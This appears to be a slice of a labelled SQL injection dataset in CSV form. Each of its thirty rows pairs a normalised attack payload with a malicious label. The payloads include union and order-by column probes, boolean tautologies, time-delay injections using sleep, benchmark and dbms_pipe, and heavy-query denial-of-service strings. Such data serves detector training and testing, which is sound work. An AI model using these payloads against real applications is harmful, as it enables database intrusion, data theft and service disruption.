row_index,payload_norm,label,sqli_type_hint
7260,"1' where 8451 = 8451 union all select null,null,null,null,null,null,null,null,null#",1,
7261,1' where 8635 = 8635 order by 1--,1,
7262,-8447 where 2850 = 2850 or 7147 = 3262,1,
7263,"1 and elt ( 4249 = 4249,7259 )",1,
7264,"1%' ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
7265,"1"" where 6179 = 6179",1,
7266,1' ) where 6842 = 6842,1,
7267,"1' ) ) as qzyp where 5081 = 5081 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1,
7268,-3937 ) ) or 3038 = 3038,1,
7269,"1%' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and '%' = '",1,
7270,1'+ ( select 'diet' where 7004 = 7004 rlike sleep ( 5 ) ) +',1,
7271,1' ) as cdrm where 4595 = 4595 order by 1#,1,
7272,"1"" ) ) as zbfj where 2285 = 2285",1,
7273,"1' ) where 4407 = 4407 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
7274,1 and 4595 = 4595#,1,
7275,-9429' ) order by 1--,1,
7276,1%' ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( '%' = ',1,
7277,"1"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""alkz"" = ""alkz",1,
7278,select ( case when ( 5152 = 7853 ) then 5152 else 5152* ( select 5152 from mysql.db ) end ) #,1,
7279,"1%"" union all select null,null,null,null,null,null#",1,
7280,"1 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
7281,"1' ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'peyy' = 'peyy",1,
7282,"1 ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,
7283,"1 ) as zmjm where 9125 = 9125 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,
7284,"-7802' ) ) ) or elt ( 8778 = 9974,9974 ) and ( ( ( 'glsq' like 'glsq",1,
7285,1 or sleep ( 5 ) #,1,
7286,"1"" and elt ( 1210 = 1210,sleep ( 5 ) ) and ""zhxm"" = ""zhxm",1,
7287,"1 ) ) as myyh where 5116 = 5116 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
7288,"1', ( select ( case when ( 4209 = 5879 ) then 1 else 4209* ( select 4209 from information_schema.character_sets ) end ) )",1,
7289,1' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( 'gzpx' = 'gzpx,1,
